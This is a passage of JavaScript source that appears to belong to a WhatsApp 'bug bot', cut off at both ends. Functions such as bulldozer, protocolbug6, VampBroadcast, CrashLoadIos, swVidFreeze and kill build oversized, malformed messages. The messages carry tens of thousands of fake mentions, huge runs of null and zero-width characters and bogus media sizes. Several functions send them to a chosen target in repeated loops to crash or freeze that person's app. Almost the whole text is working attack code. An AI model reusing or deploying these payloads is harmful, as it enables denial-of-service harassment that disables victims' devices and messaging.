        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363420088299543@newsletter",
            serverMessageId: 1,
            newsletterName: "⇞ᥬ🧊공식 ᥬBAYU 잘생긴 ⇟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await devtrust.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//=================================
// 𝗕𝗨𝗟𝗗𝗢𝗭𝗘𝗥 𝗦𝗜 𝗣𝗘𝗡𝗬𝗘𝗗𝗢𝗧 𝗞𝗨𝗢𝗧𝗔
//================================
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await devtrust.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
//==≠==========================
async function protocolbug6(target, mention) {
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "BoomXSuper",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Yamete" + "ោ៝".repeat(10000),
        title: "Hentai",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: "KIMOCHI",
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(1000)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363420088299543@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await devtrust.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//===============================
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await devtrust.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
//======================================
async function delayMakerInvisible(isTarget) {
let venomModsData = JSON.stringify({
status: true,
criador: "VenomMods",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
connCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnconnCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let stanza = [{
attrs: {
biz_bot: "1"
},
tag: "bot"
}, {
attrs: {},
tag: "biz"
}];
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 3.2,
isStatusBroadcast: true,
statusBroadcastJid: "status@broadcast",
badgeChat: {
unreadCount: 9999
}
},
forwardedNewsletterMessageInfo: {
newsletterJid: "proto@newsletter",
serverMessageId: 1,
newsletterName: `—͟͞͞🧊 공격 *CYBER XMD* ${"—͟͞͞🧊 공격 *CYBER XMD*".repeat(10)}`,
contentType: 3,
accessibilityText: `—͟͞͞🧊 공격 *CYBER XMD* ${"﹏".repeat(102002)}`
},
interactiveMessage: {
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: isTarget
},
dataSharingContext: {
showMmDisclosure: true
},
participant: "0@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net"]
},
body: {
text: "" + "ꦽ".repeat(102002) + "".repeat(102002)
},
nativeFlowMessage: {
buttons: [{
name: "single_select",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_method",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "call_permission_request",
buttonParamsJson: venomModsData + "".repeat(9999),
voice_call: "call_galaxy"
}, {
name: "form_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_learn_more",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_transaction_details",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "wa_payment_fbpin_reset",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "catalog_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_info",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_order",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "send_location",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payments_care_csat",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "view_product",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_settings",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "address_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "automated_greeting_message_view_catalog",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "open_webview",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "message_with_link_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "payment_status",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_costum",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "extensions_message_v2",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "landline_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "mpm",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_copy",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_url",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "review_and_pay",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "galaxy_message",
buttonParamsJson: venomModsData + "".repeat(9999)
}, {
name: "cta_call",
buttonParamsJson: venomModsData + "".repeat(9999)
}]
}
}
},
additionalNodes: stanza,
stanzaId: `stanza_${Date.now()}`
}
}
await devtrust.relayMessage(isTarget, message, {
participant: {
jid: isTarget
}
});
}
//================================°==
async function VampBroadcast(target, mention = true) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "*CYBER XMD is Here bitches*",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "*CYBERt Bothering Me Bro!!*"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
   
    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (mention) {
        await devtrust.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "*CYBER crasher Here Bro*" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function FreezeGC(FuckMark, jids = false) {
      var messageContent = generateWAMessageFromContent(FuckMark, proto.Message.fromObject({
             'viewOnceMessage': {
                    'message': {
                           "newsletterAdminInviteMessage": {
                                  "newsletterJid": `120363420088299543@newsletter`,
                                  "newsletterName": "AditJmK" + "48".repeat(80000) + "\u0000".repeat(920000),
                                  "jpegThumbnail": "",
                                  "caption": `JMK 4EvER`,
                                  "inviteExpiration": Date.now() + 1814400000
                           }
                    }
             }
      }), {
             'userJid': FuckMark
      });
      await devtrust.relayMessage(FuckMark, messageContent.message, jids ? {
             'participant': { 
                   'jid': FuckMark
             }
      } : {});
}

async function CrashLoadIos(devtrust, target) {
  const LocationMessage = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: " ⎋𝐑𝐈̸̷̷̷̋͜͢͜͢͠͡͡𝐙𝐗𝐕𝐄𝐋𝐙͜͢-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/rizxvelzdev",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await devtrust.relayMessage(target, LocationMessage, {
    participant: { jid: target }
  });
  console.log(randomColor()(`─────「 ⏤!CrashIOS To: ${target}!⏤ 」─────`))
}
// BUG FUNCTIONS
async function crashChannel(target) {
  await devtrust.relayMessage(target, {
    viewOnceMessage: {
      message: {
        groupStatusMentionMessage: {
          name: "CYBER - ᴄʀᴀsʜ",
          jid: target,
          mention: ["13135550002@s.whatsapp.net"],
          contextInfo: {
            businessOwnerJid: "13135550002@s.whatsapp.net"
          }
        }
      }
    }
  }, {});
}
// BUG FUNCTIONS
async function swVidFreeze(target, sebut = false) {
  for(let z = 0; z < 50; z++) {
    const media = generateWAMessageFromContent(target, {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "OU+MmRfL9SSO0MZI2VcrC8/Vqr8U+bkKE/bnTg74YY8=",
        fileLength: 252408,
        seconds: 15,
        mediaKey: "Nw/2xPEw0z5yDWluRdpNDAZn8lWUFH1Ui6yjpUoDHpk=",
        height: 816,
        width: 768,
        fileEncSha256: "vz7HOSPHOcj3R8De5glz20ktBJIt8LhkN8gX5t2nLNI=",
        directPath: "/v/t62.7161-24/537813786_1344011573884191_8566149874993540561_n.enc?ccb=11-4&oh=01_Q5Aa2wET26JBHdMRpUnzy_3UT6UaJYbUjdn6sEgQ1ahOCG62aQ&oe=69264578&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1761536267,
        caption: "Radiation - Ex3cutor" + "ꦾ".repeat(22), 
        contextInfo: {
          statusAttributionType: 2,
          isForwarded: true, 
          forwardingScore: 7202508,
          forwardedAiBotMessageInfo: {
            botJid: "13135550002@bot", 
            botName: "Meta AI", 
            creatorName: "7eppeli - Yuukey"
          }, 
          mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        streamingSidecar: "ZCTXLaWRSUS57M2WDi5Rmxk1kq9Jm8uPJAtt0Qm2Pdxh3hRYFM3IOg==",
        thumbnailDirectPath: "/v/t62.36147-24/531652303_1341445584346193_3521117362172863397_n.enc?ccb=11-4&oh=01_Q5Aa2wEK08NNxekWOl2uTJONY8JpIjdWijZ8uBMRvlhIv7lFWw&oe=6926531E&_nc_sid=5e03e0",
        thumbnailSha256: "XFmelyVsc04pajE/UH7cqxRIbOT8FF2PPqnjo/jIdDg=",
        thumbnailEncSha256: "B4u4FhVwI1OC3DTOuSLxwv5NKTJ5s3YFfZ/oqrI8hpE=",
        annotations: [
          {
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1328419335741957",
                songId: "1221313878044460",
                author: "7eppeli.pdf",
                title: "ꦾ".repeat(9000),
                artworkDirectPath: "/v/t62.76458-24/538001898_1721507205206204_1856297105077950312_n.enc?ccb=11-4&oh=01_Q5Aa2wG6vgDeEBNpBou9E_hlOwfQid9sttzm8sXIT_GL-MyJYQ&oe=692643CB&_nc_sid=5e03e0",
                artworkSha256: "DQIz0Oj5q9X3DMmLIAEZ+0dGN0tVWWhKx7AMgOtuhCs=",
                artworkEncSha256: "pzljQhAsS8uKKVvBHwYhjFhYXb2oz7Ha6io5qu7oBW4=",
                artistAttribution: "https://id.Zeppeli.pdf",
                countryBlocklist: "+62",
                isExplicit: true,
                artworkMediaKey: "+O9eJ1/zuS2GRYDWkHgK7nohkP5zRIMAEhnmObrU6E0="
              }
            },
            embeddedAction: true
          }
        ]
      }
    }, {});
    const additionalNodes = [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              }
            ],
          }
        ],
      }
    ];
    await devtrust.relayMessage("status@broadcast", media.message, {
      messageId: media.key.id,
      statusJidList: [target],
      additionalNodes,
    });
  }
  if(sebut) {
    let devtrust = generateWAMessageFromContent(target, proto.Message.fromObject({
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: media.key,
            type: "STATUS_MENTION_MESSAGE",
            timestamp: Date.now() + 720,
          },
        },
      }
    }), {})
    await devtrust.relayMessage(target, demmy.message, {
      participant: { jid:target }, 
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined,
        }
      ],
    });
  }
}
// end of Bug function
// BUG FUNCTIONS 
async function gsInter(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS
async function Delay1(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS 
async function delay2(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug function 
// BUG FUNCTIONS 
async function kill(target, zid = true) {
  for(let z = 0; z < 75; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await devtrust.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
} 
// end of Bug functions
//=========== ONE MESSAGE FC =========//
async function oneMsgFC(devtrust, target) {
  const sockUrl = 'https://files.catbox.moe/mxg7vh.mp4';
  const video = await prepareWAMessageMedia(
